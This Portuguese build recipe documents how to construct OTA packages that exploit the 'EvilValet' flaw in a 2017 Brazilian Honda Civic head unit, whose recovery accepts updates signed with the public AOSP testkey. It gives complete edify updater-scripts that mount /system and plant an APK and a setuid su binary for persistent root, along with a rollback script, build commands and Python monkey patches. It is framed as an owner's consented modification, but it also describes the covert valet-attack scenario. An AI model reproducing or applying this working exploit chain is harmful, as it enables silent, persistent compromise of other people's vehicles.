# Receita de build do pacote OTA

Como construir um pacote OTA que a central Civic 2017 BR aceita. Cobre o pacote de instalação (APK + su) e o pacote de rollback (remove ambos). Para safra `1.F187.16`, rom_type `0040`. Base para qualquer modificação futura.

## Fundamentos EvilValet

### Fontes

Duas fontes complementares:

1. **Post de anúncio** (contexto do ataque, nomenclatura): [juniperspring.org/posts/honda-evil-valet](https://juniperspring.org/posts/honda-evil-valet/), publicado em 13/06/2026 pelo mesmo autor (librick / Eric McDonald). **O autor explicitamente diz "This blog article is not intended as a technical writeup"** — então o post é anúncio e narrativa do ataque, não documentação técnica operacional.

2. **Fonte primária técnica** (como fazer o pacote): [`tooling/references/ic1101/docs/updates.md`](../../tooling/references/ic1101/docs/updates.md), do mesmo autor. **Esse é o documento que usamos em todo o projeto**: fluxo do `daupdater`, checklist completa, formatos, risco de recovery loop, mecanismo de version check, etc.

### O "Evil Valet" — origem do nome

Nome descrito pelo autor como variante automotiva do *evil maid attack*. Exemplo literal do post: um jornalista deixa o carro com um manobrista (valet) de hotel que trabalha para uma agência de inteligência. O manobrista pluga um pendrive na porta USB frontal e o headunit é modificado. Quando o carro é devolvido, o jornalista não percebe nada — a modificação persiste.

Nossa aplicação é benigna (dono do veículo, modificação consentida). Mas o mecanismo é o mesmo.

### A vulnerabilidade (resumo técnico)

Três pontos descritos pelo autor:

1. A chave de teste pública do AOSP (`testkey.x509.pem`) está em `res/keys` do recovery do headunit.
2. O binário `recovery` foi forkado pela Honda/Mitsubishi, mas a rotina `verify_file` de verificação de assinatura é essencialmente idêntica ao do AOSP stock.
3. Consequência: qualquer `update.zip` assinado com `testkey.pk8` + `testkey.x509.pem` (ambos públicos no AOSP mirror em `aosp-mirror/platform_build/target/product/security/`) passa pela verificação.

Resultado: execução arbitrária de código no HU via pendrive FAT32 na porta USB frontal.

### Safras confirmadas publicamente

| Safra | Fonte | Como foi confirmada |
|---|---|---|
| Civic 2021 US (`1.F1A5.15`, rom_type `1115`) | juniperspring post + ic1101 updates.md § Known Versions | Autor fez EvilValet no próprio headunit |
| Update file EU `MRC_EU_SW_v12_4.zip` | juniperspring post + ic1101 updates.md § Known Versions (DA `1.F197.70`, rom_type `2250`) | Autor inspecionou arquivo público do CivicX, confirmou assinatura testkey |
| **Civic 2017 EXL BR (`1.F187.16`, rom_type `0040`)** | **nós (fase7-deploy-2026-10-16)** | **nós deployamos APK + su via EvilValet, deploy funcional confirmado 2026-10-16** |

Autor avisa: "This seems highly likely" que outras safras também usam testkey, mas não confirmado nelas. Nosso trabalho é a primeira confirmação pública em safra brasileira.

### Caveats explícitos do autor

Do post:

- **Risco de recovery loop** se safra for diferente: "any changes that don't match my build could lead to unexpected behavior and recovery loops." Nosso projeto enfrentou essa possibilidade — mitigamos com rom_type correto + pacote de rollback pronto antes de deployar.
- **Verificações de versão podem ser "spoofed"** mas o autor remete aos documentos técnicos (`ic1101 updates.md`) para como.
- **Toolchain ARMv7** experimental do autor ainda não é público (não usamos — nossos binários vêm do root-honda + HondaHack).
- **O autor pode ter instalado HondaHack antes** no próprio headunit, o que poderia ter injetado chaves no keystore — ele próprio levanta essa dúvida. Mas o update file EU `MRC_EU_SW_v12_4.zip` é independente e confirma que o problema não é só do headunit dele.

### Nossa dívida com o trabalho upstream

Sem o `ic1101 updates.md` (que explica o fluxo detalhado do `daupdater`, as condições de staging, o risco de boot loop com command persistente, a existência de `SwUpdate2.txt`/`SwUpdate.txt`) + o `ic1101/ota-builder` (que faz o grosso do trabalho de montar/assinar o pacote), este projeto demoraria **meses** ao invés de ~2 dias de deploy. Nosso `build.py` é um wrapper em cima do `ota-builder` com monkey patches para adaptar à nossa safra — não reinvenção da roda.

## Arquitetura do build

Nosso pipeline reutiliza o `ic1101/ota-builder` (clonado em `tooling/references/ic1101/ota-builder/`), com **monkey-patching** em cima:

```
tooling/ota-build/
├── bin/
│   ├── busybox        # ARM estático, 1.1MB, do HondaHack
│   └── su             # ARM estático, 133KB, do root-honda
├── overlay/
│   └── system/app/
│       └── AutoOk.apk # nosso APK
├── build.py           # pacote INSTALL — APK + su
├── build-rollback.py  # pacote ROLLBACK — remove APK + su
└── output/            # outputs gerados por build.py
```

`build.py` importa `ic1101/ota-builder/src/main.py` como `upstream`, redefine `stage_tree`, `create_updater_script` e `build_mdt` via monkey patch, e dispara o build upstream com os overrides.

## Fluxo de ponta a ponta

```
┌─────────────────────────┐
│   AutoOk.apk            │   our-apk/ (compilado com AGP 7.4.2 + apksigner)
│   compilado em our-apk  │
└──────────┬──────────────┘
           │ copy
           ▼
┌─────────────────────────┐
│   overlay/system/app/   │   staging dir do pacote OTA
│   AutoOk.apk            │
└──────────┬──────────────┘
           │ build.py
           ▼
┌─────────────────────────┐   output/20261016TXXXXXZ/
│   SwUpdate2.txt         │   SwUpdate2.txt
│   0040/                 │   0040/
│   └── SwUpdate.mdt      │     └── SwUpdate.mdt (assinado testkey AOSP)
└──────────┬──────────────┘
           │ sudo cp pro pendrive
           ▼
┌─────────────────────────┐
│   Pendrive FAT32 MSDOS  │
│   /SwUpdate2.txt        │
│   /0040/SwUpdate.mdt    │
└──────────┬──────────────┘
           │ no carro, porta USB-A frontal + AUDIO 5s
           ▼
┌─────────────────────────┐
│   SystemUpdate app      │   mostra "Software update → Copying"
│   copia para /data      │   agenda reboot via daupdater
└──────────┬──────────────┘
           │ reboot
           ▼
┌─────────────────────────┐
│   daupdater             │   estaga /cache/recovery/command
│   reboot para recovery  │
└──────────┬──────────────┘
           │
           ▼
┌─────────────────────────┐
│   recovery              │   valida assinatura testkey (passa)
│   aplica updater-script │   executa busybox + edify
└──────────┬──────────────┘
           │
           ▼
┌─────────────────────────┐
│   AutoOk.apk em /system │
│   su em /system/xbin    │
│   APK + root persistente│
└─────────────────────────┘
```

## Pacote de INSTALAÇÃO

### Conteúdo final do `SwUpdate.mdt`

```
META-INF/com/google/android/update-binary    229992 bytes  # interpretador edify do AOSP
META-INF/com/google/android/updater-script     1699 bytes  # script edify (nosso, gerado)
META-INF/com/android/otacert                   1675 bytes  # cert do pacote
META-INF/MANIFEST.MF                            724 bytes  # manifest de assinatura
META-INF/CERT.SF                                777 bytes  # cert.sf
META-INF/CERT.RSA                              1714 bytes  # cert.rsa (testkey AOSP)
busybox                                     1153692 bytes  # ARM estático
sleep                                         72140 bytes  # ARM estático (do ic1101)
su                                           133472 bytes  # ARM estático (do root-honda)
system/app/AutoOk.apk                         12794 bytes  # nosso APK
system/build.prop                                46 bytes  # fake, só pra passar check do daupdater
system/vendor/build.prop                         21 bytes  # fake, com custom_rom.type=0040

Total: 10 arquivos, 211KB comprimido, 1.6MB uncompressed.
```

### Updater-script (edify)

```
show_progress(1.000000, 0);
set_progress(0.000000);

# Extrair busybox para /tmp (tmpfs do recovery)
package_extract_file("busybox", "/tmp/busybox");
set_perm(0, 0, 0755, "/tmp/busybox");

# Log inicial
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox echo === INSTALL START $(/tmp/busybox date) rom_type=0040 === > /mnt/usbdrive1/install-0040.log 2>&1");

# Mount /system (APP = mmcblk0p3) em modo rw via edify
mount("ext4", "EMMC", "/dev/block/platform/sdhci-tegra.3/by-name/APP", "/system");

# Debug: ver mounts e estado antes
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox mount >> /mnt/usbdrive1/install-0040.log 2>&1");
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox ls -la /system/app/AutoOk.apk /system/xbin/su >> /mnt/usbdrive1/install-0040.log 2>&1");

# Deploy AutoOk.apk em /system/app
package_extract_file("system/app/AutoOk.apk", "/system/app/AutoOk.apk");
set_perm(0, 0, 0644, "/system/app/AutoOk.apk");

# Garantir /system/xbin existe (idempotente)
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox mkdir -p /system/xbin >> /mnt/usbdrive1/install-0040.log 2>&1");

# Deploy su setuid em /system/xbin
package_extract_file("su", "/system/xbin/su");
set_perm(0, 0, 06755, "/system/xbin/su");

# Debug: ver estado final
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox ls -la /system/app/AutoOk.apk /system/xbin/su >> /mnt/usbdrive1/install-0040.log 2>&1");
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox sync");

# Desmontar
unmount("/system");

# Log final + sleep para janela de retirada do pendrive
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox echo === INSTALL END $(/tmp/busybox date) === >> /mnt/usbdrive1/install-0040.log; /tmp/busybox sync");

package_extract_file("sleep", "/tmp/sleep");
set_perm(0, 0, 0755, "/tmp/sleep");
set_progress(1.000000);
run_program("/tmp/sleep", "30");
```

Observações críticas:

- **Edify `mount("ext4", "EMMC", ...)`** é o backend oficial do recovery AOSP e sabe lidar com remount. Prefira sobre `busybox mount` — mais seguro.
- **`set_perm` com `06755`**: setuid (04000) + setgid (02000) + rwx owner (0700) + rx group (050) + rx other (05). Equivalente a `chmod u+rwxs,g+rxs,o+rx`.
- **Logging detalhado para o pendrive**: cada passo escreve em `install-0040.log` no pendrive. Crucial para debug.
- **`sync` antes de `unmount`**: garante que writes para `/system` são flushados antes da partição ser desmontada.

### Como construir

```bash
cd /home/khalleb/repositorios/honda-civic-headunit
python3 tooling/ota-build/build.py
```

Saída:

```
INFO: deploy: /system/app/AutoOk.apk owner=0:0 mode=0644
INFO: rom_type=0040 -> tooling/ota-build/output/<timestamp>/0040/SwUpdate.mdt
OK: tooling/ota-build/output/<timestamp>
```

### Como carregar no pendrive

Script auxiliar: `./tooling/scripts/prepare-pendrive-install.sh`. Resumo do que ele faz:

1. **Guard de identidade:** confere que `/dev/sda` é o SanDisk Cruzer Fit USB (abort se não for).
2. Monta o pendrive.
3. Apaga tudo exceto `lost+found`.
4. Copia `SwUpdate2.txt` + diretório `0040/` do output pro pendrive.
5. `sync` + umount.

Rodar:

```bash
sudo ./tooling/scripts/prepare-pendrive-install.sh /dev/sdX
```

## Pacote de ROLLBACK

### Conteúdo

```
META-INF/com/google/android/update-binary    229992 bytes
META-INF/com/google/android/updater-script     1316 bytes  # script edify (remove APK + su)
META-INF/com/android/otacert                   1675 bytes
META-INF/MANIFEST.MF                            595 bytes
META-INF/CERT.SF                                648 bytes
META-INF/CERT.RSA                              1714 bytes
busybox                                     1153692 bytes
sleep                                         72140 bytes
system/build.prop                                46 bytes
system/vendor/build.prop                         21 bytes

Total: 10 arquivos, 211KB comprimido.
```

**Diferenças vs INSTALL:** sem `AutoOk.apk`, sem `su`. Updater-script faz `rm` em vez de `package_extract_file`.

### Updater-script de rollback

```
show_progress(1.000000, 0);
set_progress(0.000000);
package_extract_file("busybox", "/tmp/busybox");
set_perm(0, 0, 0755, "/tmp/busybox");
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox echo === ROLLBACK START $(/tmp/busybox date) === > /mnt/usbdrive1/rollback-0040.log 2>&1");

mount("ext4", "EMMC", "/dev/block/platform/sdhci-tegra.3/by-name/APP", "/system");

# Confirma presença dos arquivos
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox ls -la /system/app/AutoOk.apk /system/xbin/su >> /mnt/usbdrive1/rollback-0040.log 2>&1");

# Remove
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox rm -f /system/app/AutoOk.apk /system/xbin/su >> /mnt/usbdrive1/rollback-0040.log 2>&1; /tmp/busybox echo rm-done >> /mnt/usbdrive1/rollback-0040.log");

# Confirma remoção
run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox ls -la /system/app/AutoOk.apk /system/xbin/su >> /mnt/usbdrive1/rollback-0040.log 2>&1 || /tmp/busybox echo removal-confirmed >> /mnt/usbdrive1/rollback-0040.log");

run_program("/tmp/busybox", "sh", "-c", "/tmp/busybox sync");
unmount("/system");

run_program("/tmp/busybox", "sh", "-c",
  "/tmp/busybox echo === ROLLBACK END $(/tmp/busybox date) === >> /mnt/usbdrive1/rollback-0040.log; /tmp/busybox sync");

package_extract_file("sleep", "/tmp/sleep");
set_perm(0, 0, 0755, "/tmp/sleep");
set_progress(1.000000);
run_program("/tmp/sleep", "30");
```

### Como construir

```bash
cd /home/khalleb/repositorios/honda-civic-headunit
python3 tooling/ota-build/build-rollback.py
```

Saída em `tooling/ota-build/output-rollback/<timestamp>/0040/SwUpdate.mdt`.

### Como carregar no pendrive

Script auxiliar: `./tooling/scripts/prepare-pendrive-rollback.sh`.

```bash
sudo ./tooling/scripts/prepare-pendrive-rollback.sh /dev/sdX
```

## O monkey patch do build.py

Entendimento interno — como `build.py` modifica o `ic1101/ota-builder` sem editá-lo diretamente.

### 1. Patch de `stage_tree` para incluir busybox + su

```python
_orig_stage_tree = upstream.stage_tree

def _patched_stage_tree(staging, overlay_paths, meta, rom_type,
                       overlay_dir, update_binary, sleep_binary, partitions):
    _orig_stage_tree(staging, overlay_paths, meta, rom_type, overlay_dir,
                     update_binary, sleep_binary, partitions)
    # Adicionar nossos binários ao staging
    shutil.copy2(BUSYBOX_SRC, staging / "busybox")
    shutil.copy2(SU_SRC, staging / "su")

upstream.stage_tree = _patched_stage_tree   # ESSENCIAL — sem essa linha, o patch não é aplicado
```

**Lição aprendida:** faltou essa última linha de atribuição numa iteração inicial. O bug era sutil: a função patched existia mas nunca era instalada no namespace do upstream. Resultado: pacotes gerados sem busybox nem su. Debugar demorou. Correção: adicionar linha de atribuição.

### 2. Patch de `create_updater_script` para gerar nosso script

```python
def our_create_updater_script(overlay_paths, meta, partitions):
    rt = CURRENT_ROM_TYPE
    # ... gera o script edify ...
    return "\n".join(out) + "\n"

upstream.create_updater_script = our_create_updater_script
```

### 3. Patch de `build_mdt` para rastrear rom_type atual

Necessário porque `create_updater_script` precisa saber qual rom_type está sendo buildado (pra incluir em log paths), mas o upstream não passa esse parâmetro.

```python
CURRENT_ROM_TYPE = ""
_orig_build_mdt = upstream.build_mdt

def _tagged_build_mdt(rom_type, *args, **kwargs):
    global CURRENT_ROM_TYPE
    CURRENT_ROM_TYPE = rom_type
    return _orig_build_mdt(rom_type, *args, **kwargs)

upstream.build_mdt = _tagged_build_mdt
```

### 4. Keep upstream intact

Vantagens dessa abordagem (monkey patch) sobre editar ic1101/ota-builder diretamente:
- `ic1101` continua pullable via git sem conflito.
- Nossas mudanças ficam isoladas em `tooling/ota-build/build.py`.
- Se o upstream fizer breaking changes, só o nosso patch precisa adaptar.

## O APK AutoOk — overview do build

Detalhes completos em [04-apk-autook-detalhes.md](04-apk-autook-detalhes.md). Resumo da parte de build:

```bash
cd our-apk
./gradlew clean assembleRelease
# saída: app/build/outputs/apk/release/app-release-unsigned.apk

APKSIGNER=/home/khalleb/sdks/Android/build-tools/33.0.2/apksigner
$APKSIGNER sign \
  --ks ~/.android/debug.keystore --ks-pass pass:android \
  --out app/build/outputs/apk/release/AutoOk.apk \
  app/build/outputs/apk/release/app-release-unsigned.apk

# Copia pro overlay do pacote OTA
cp our-apk/app/build/outputs/apk/release/AutoOk.apk \
   tooling/ota-build/overlay/system/app/AutoOk.apk
```

## Dependências do ambiente

Para reproduzir o build:

| Dep | Versão | Instalação Fedora |
|---|---|---|
| JDK | 17 (Temurin) | `~/sdks/jdk-17` manual (AGP 7.4.2 não suporta JDK 25) |
| Android SDK | API 33 + build-tools 33.0.2 | `~/sdks/Android` via `sdkmanager` |
| Gradle | 7.6.4 | pinned via `gradlew` |
| Python | 3.13+ | `dnf install python3` (3.14 funciona) |
| Java (p/ signapk) | qualquer ≥ 8 | sistema (`openjdk 25` roda) |

Setup detalhado em `MIGRATION/setup.sh` + `docs/fase5-apk/compilar.md`.

## Rede de segurança

Antes de descer para o carro com o pendrive INSTALL:
1. Pacote ROLLBACK **já construído** e no notebook em `output-rollback/`.
2. Scripts `update-pendrive-{install,rollback}.sh` prontos.
3. Dump completo do /system em `tooling/apks-dumped/dump-0040/` — se precisar restaurar algo manualmente.

Nunca deployar INSTALL sem o ROLLBACK pronto.

## Checklist pré-deploy

- [ ] APK atualizado em `our-apk/` (se precisar).
- [ ] `./gradlew assembleRelease` passou.
- [ ] `apksigner sign` passou, APK em `app/build/outputs/apk/release/AutoOk.apk`.
- [ ] APK copiado para `tooling/ota-build/overlay/system/app/AutoOk.apk`.
- [ ] SHA-1 do APK no overlay bate com o source.
- [ ] `python3 tooling/ota-build/build.py` executou sem erro.
- [ ] `unzip -l` do `SwUpdate.mdt` lista: `busybox`, `su`, `AutoOk.apk`, `sleep`, `update-binary`, `updater-script`.
- [ ] Pacote ROLLBACK já construído em `output-rollback/`.
- [ ] Saída do `prepare-pendrive-install.sh` mostra `=== Usando build: .../output/<timestamp novo>` (o script pega o mais novo; não precisa editar).
- [ ] Pendrive formatado FAT32 MSDOS, não superfloppy.
- [ ] Script rodado via `sudo bash ...-install.sh` e a conferência mostra `OK` em `SwUpdate2.txt` e `0040/SwUpdate.mdt`.
